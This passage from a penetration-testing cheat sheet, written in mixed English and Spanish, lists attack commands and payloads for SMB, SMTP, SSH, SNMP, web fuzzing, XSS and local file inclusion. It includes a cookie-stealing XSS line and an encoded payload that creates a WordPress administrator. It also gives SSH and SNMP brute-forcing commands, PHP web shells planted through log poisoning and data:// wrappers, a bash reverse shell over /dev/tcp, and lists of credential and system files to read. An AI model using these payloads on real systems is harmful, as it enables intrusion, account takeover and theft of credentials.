proxychains smbclient -L //IP/ -U DOMAIN/user%PASSWORD \
| awk '{print $1}' \
| tr -d ' ' \
| sed -n 4,10p \
| while read sharedFolder; do
    echo "===${sharedFolder}===";
    proxychains smbclient "//IP/${sharedFolder}" -c "dir";
    echo;
done

smbclient -L IP -N | grep -i "disk" | sed 's/\s*\(.*\)\s*Disk.*/\1/'| while read sharedfolder; do echo "======{$sharedfolder}=====";smbclient -N "/IP/${sharedfolder}" -c dir; echo; done
```

```c
smbclient -N -L IP 2>/dev/null | grep "Sharename" | awk '{print $1}' 
| while read sharedFolder; do echo "==="${sharedFolder}"=="; smbclient //IP/${sharedFolder} -c "dir"; echo; done
```

```c
for i in {6,7,21,19,15,30,14,20}; do proxychains smbclient -L  //IPX.X.X.${i} -U DOMAIN/USER%PASS; done
```

or

```c
smbclient -L 10.10.11.152 -N 2>/dev/null | awk '{print $1}' | tr -d ' '  | sed -n 4,10p | 
while read sharedFolder; do echo "===$(sharedFolder)=="; smbclient //10.10.11.152/${sharedFolder} -c "dir"; echo; done
```
Download folders 

```c
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'`
```

```c
impacket-smbclient RANDOM@IP
```

##### Download multiple files at once

```c
mask""
recurse ON
prompt OFF
mget *
```

#### SMTP

```c
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()  
```

```c
python3 smtp.py root IP
```

In windows

```c
Test-NetConnection -Port 25 IP
```

#### SSH

```c
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

Introduce ower own public key on victims machine

Buscar tambien

```c
id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk,  id_dsa
```

```c
cat id_rsa.pub | tr -d '\n'  
```

```c
echo "ssh_rsa" > uthorised_keys
```

```c
ssh-keygen -f root
```

```c
ssh -i root root@IP
```

Give privilege 600 
```c
chmod 600 KEYS
```

Access id_rsa
```c
ssh -i id_rsa -vl USER IP
```

Bruteforce user pass

```c
medusa -h IP -U users.txt -P passwords.txt -M ssh IP
patator ssh_login host=IP port=PORT password=PASS_FILE user=UserFILE persistent=0 -x ignore:mesg='failed.
```

Local port fordwarding 

```c
ssh -L 9002:127.0.0.1:PORTservicio
ssh -L MI_PUERTO:127.0.0.1:ELPUERTO_DE_LA_MAQUINA USER@IP -p 2222 -i id_ecdsa

```

```c
ssh -i KEY user@IP
```

```c
ssh user@IP -p PASS COMMAND
```

Crack rsa key

```c
ssh2john.py
```

First ssh2john ID to get the hash sshng 

```c
/usr/share/johj/ssh2john.py
```

```c
/usr/share/john/ssh2john.py id_rsa > hash
```

Local port fordwarding de VNC

```c
sshpass -p 'PASS' ssh USER@IPvictim -L PORT:127.0.0.1:PORT
```

Execute commands

```c
sshpass -p 'PASS' ssh USER@IPvictim "command"
```

```c
sshpass -p 'henrial123' ssh 10.10.14.42@10.10.10.119 "/usr/sbin/tcpdump -i any -w - 'not port 22'"  | wireshark -k -i -
```

Download files

```c
scp user@IP:/tmp/capture.pcap .
```

When getting the error 
```c
"no matching key exchane method found"
ssh -okexAlgorithims=+diffie-hellman-group1-sha1 -p PORT user@IPpa
```

Sshuttle to pivot

```c
sshuttle -v -r MI_IP RED_Q_KIERO/24 --ssh-cmd 'ssh -i id_rsa'
```

#### Time and Date

##### Get the Server Time

```c
sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

##### Stop virtualbox-guest-utils to stop syncing Time

```c
sudo /etc/init.d/virtualbox-guest-utils stop
```

##### Stop systemd-timesyncd to sync Time manually

```c
sudo systemctl stop systemd-timesyncd
```

##### Disable automatic Sync

```c
sudo systemctl disable --now chronyd
```

##### Options to set the Date and Time

```c
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo net time \\<RHOST> /set /y
sudo ntpdate <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
```

##### Keep in Sync with a Server

```c
while [ 1 ]; do sudo ntpdate <RHOST>;done
```

#### Searchsploit

```c
-x look at an exploit
-m move to exploit folder
```

#### Tmux

```c
ctrl b + w    # show windows
ctrl + "      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
```

Copy & Paste
```c
:setw -g mode-keys vi
ctrl b + [
space
enter
ctrl b + ]
```

Search
```c
ctrl b + [    # enter copy
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
```

Logging
```c
ctrl b
shift + P    # start / stop
```

Save Output
```c
ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer <FILE>.txt
```

#### Upgrading Shells

```c
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

or

```c
Ctrl + z
stty -a
stty raw -echo;fg
Enter
Enter
stty rows 37 cols 123
export TERM=xterm-256color
bash
```

or

```c
Victim:
script /dev/null -c bash
 + Ctr Z

Attacker:  
stty raw -echo; fg
reset
Enter → even if its not seing

Victim:
reset
xterm
echo $TERM → not changed so: 
export TERM=xterm
export SHELL=bash

Proportions of attacker machine	e
stty -a
Check numer of columns and rows
	
stty rows XX columns YY

	stty rows 53 columns 161
```

Alternatively:

```c
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Oneliner

```c
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### Fixing Staircase Effect

```c
env reset
```

or

```c
stty onlcr
```

#### VirtualBox

```c
sudo pkill VBoxClient && VBoxClient --clipboard
```

#### virtualenv

```c
sudo apt-get install virtualenv
virtualenv -p python2.7 venv
. venv/bin/activate
```

```c
python.exe -m pip install virtualenv
python.exe -m virtualenv venv
venv\Scripts\activate
```

### Information Gathering

#### Passive 

```c
whois megacorpone.com -h IP
```

#### memcached

>  https://github.com/pd4d10/memcached-cli

```c
memcrashed / 11211/UDP

npm install -g memcached-cli
memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

stats items
stats cachedump 1 0
get link
get file
get user
get passwd
get account
get username
get password
```

#### NetBIOS

```c
nbtscan <RHOST>
nmblookup -A <RHOST>
```

#### Nmap

```c
sudo nmap -A -T4 -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```
Normal

```c
nmap -sT ip
```
PING SCAN-sN

```c
nmap -sn ip
```

SCAN SYN or hidden

UDP SCAN

```c
nmap -sU IP
sudo nmap -sU -sS IP
```

udp-proto-scanner.pl

One port

```c
nmap -pPORT --open -T5 -v -n IP
```

Path of nmap scripts: /usr/share/nmap/scripts   
interesting scripts: 
    - smb-os-discovery.nse - Averiguar OS mediante SMB
    - dns-zone-transfer.nse - Transferencia de zona
    - cd /usr/share/nmap/scripts/  cat script.db  | grep "\"vuln\""

```c
nmap -sV -p 443 --script "vuln" IP
nmap --script=dns-zone-transfer -p 53 <servidorDNS>
nmap -v -p 139,445 --script smb-os-discovery IP  for SMB
```

```c
nmap -p- --open -T5 -v -n -oG allPorts IP 
```

extractPorts 

```c
nmap -sC -sV -p 80,2222 -oN allPorts IP
```
Format save -oN NOMBREFICHERO
  
Find specific scripts

```c
  locate .nse | xargs grep "categories" | grep -oP ‘".*?"’ | sort -u
```

```c
nmap -p80 --script "names"
```

```c
nmap -n -Pn -p 110, -sV IP -vv -A
```

```c
nmap -Pn -p- IP
```

Scripts 

```c
nmap -sv -Pn -n --scripts=smb* IP
```

Find vulnerabilities

```c
nmap -Pn -n --script vuln IP
```

```c
nmap -sV --script http-enum -p80 IP -oN webscan
```

OUTPUT FORMAT 
-oX xml format
xsltproc <nmap-output.xml> -o <nmap-output.html> xsltproc target.xml -o /var/www/html/index.html
 -oG version grepeable
 -oN te lo guarda normal
 
For Windows machines
 
```c
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- IP -oN
```

```c
 nmap -sS  --open -vvv -n -Pn -p- IP --max-retries 0  -oN
```

 
All ports Scan

```c
  nmap -sS --min-rate 5000 --open -vvv -n -v -Pn -p- IP  → 5000 packets per seconds


  -sS simple scan
  -min-rate paquetes por segundo 
  -n no resolucion dns
  -Pn no aplique host/discovery
  -sC scripts basicos de enumeracion
  -sV version y servicio en cada puerto
  -obtener sistema operativo -O
  - escaneo “completo” -A
  ```

```c
  Nmap HTB ports=$(nmap -p- --min-rate=1000  -T4 IP PORT | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)nmap 
```

#### Script Port Scanning

```c
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
```

```c
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

Powershell

```c
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
```

#### snmpwalk

```c
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v 2c -c security <RHOST> NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
snmpwalk -v 2c -c public <RHOST> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
snmpwalk -v 1 -c public  <RHOST> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

community strings
https://www.poplabsec.com/snmp-pentesting/

```c
python3 snmpbrute.py -t IP
```

```c
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target-ip> snmp
```


### Web Application Analysis

#### Burp Suite

```c
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

#### Set Proxy Environment Variables

```c
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

#### cadaver

```c
cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

```c
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

#### Cross-Site Scripting (XSS)

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

##### XSS client-Side Attack

###### Request Example

```c
<a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
```

###### Get nonce

```c
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

###### Update Payload Script

```c
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

###### Compress Payload Script

> https://jscompress.com/

```c
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

##### Encoding Function

```c
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)
```

###### Encoded Payload

```c
118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
```

###### Execution

```c
curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
))</script>" --proxy 127.0.0.1:8080
```

#### ffuf

```c
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
ffuf -u http://IP -H "Host: FUZZ.SUB.example.com" -w /usr/share/secLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

##### API Fuzzing

```c
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

##### Searching for LFI

```c
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

##### Fuzzing with PHP Session ID

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

##### Recursion

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
```

##### File Extensions

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
```

##### Rate Limiting

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
```

##### Virtual Host Discovery

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
```

##### Massive File Extension Discovery

```c
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

#### GitTools

https://education.github.com/git-cheat-sheet-education.pdf

```c
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

##### Common File Extensions

```c
txt,bak,php,html,js,asp,aspx
```

##### Common Picture Extensions

```c
png,jpg,jpeg,gif,bmp
```

##### POST Requests

```c
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

##### DNS Recon

```c
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

##### VHost Discovery

```c
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

##### Specifiy User Agent

```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

#### Local File Inclusion (LFI)

```c
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```
###### Log Poissoning


LFI→ LOG POSSOINING→ RCE
Log stored path:
/var/log/httpd-access.log
/ssh →  var/log/auth.log

```c
ssh '<?php system("whoami"); ?>'@IP 
```

User agent header:

```c
 import requests
 headers= {'User-Agent': "<?php system("whoami"); ?>"}
 r=requests.get("http://IP, headers=headers")
```
In the httpd log storage the result will appear
 Obtain code:
 headers= {'User-Agent': "<?php system($_REQUEST['cmd']); ?>"}
 Execute commands in the url 

```c
&cmd=COMMANDO
```
Para  obtener una shell
```c
&cmd=SHELL
```

Change User-Agent. Only once and then remove it

```c
<?php echo system($_GET['cmd']); ?>
```

```c
../../../../../../../../../var/log/apache2/access.log
```

Then try to list process

```c
../../../../../../../../../var/log/apache2/access.log&cmd=ps
```

for cmd=

```c
bash -c "bash -i >& /dev/tcp/LOCAL_IP/LOCAL_POR 0>&1"
listen to the LOCAL_PORT nc -nlvp LOCAL_PORT
```

URL Encoded

```c
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP%2FPORT%200%3E%261%22
```

##### Until php 5.3

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

##### Null Byte

```c
%00
0x00
```

##### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

Interesting routes:

En .ssh look for:

```c
id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk,  id_dsa
```

```c
/home/USER/.ssh/.id_rsa
/etc/passwd
/etc/shadow
/etc/login.def
/proc/net/tcp 
/proc/sched_debug
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd
```

```c
cat tcp.txt| awk '{print $2}' | grep -v "address" | awk '{print $2}' FS=: | sort -u
```

List of paths https://github.com/carlospolop/Auto_Wordlists

###### PHP

```c
/index.php?file=php://filter/convert.base64-encode/resource=FILE.php
```

```c
curl -s "http://=/proc/net/fib_trie" |grep -i "host local" -B 1 | grep -oP '\d{1,3}\d{1,3}\d{1,3}\d{1,3}' | sort -u
```

Open internal ports

```c
curl -s "http://=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}'  FS=":" | sort -u
```

```c
for port in $(curl); do echo "[port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
```

Try

```c
....//....//....//
```

Unicode https://jlajara.gitlab.io/Bypass_WAF_Unicode  https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability

###### nginx paths
	/etc/nginx
	/etc/nginx/nginx.conf/etc/nginx/nginx.conf
	/etc/nginx/sites-available/
	/etc/nginx/sites-enabled/
	/var/log/nginx/access.log
	/var/log/nginx/error.log

##### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```

Use the data:// wrapper with base64-encoded data

```c
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

```c
curl "http:/IP/PORT/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

##### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

##### Linux Files

```c
/app/etc/local.xml
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
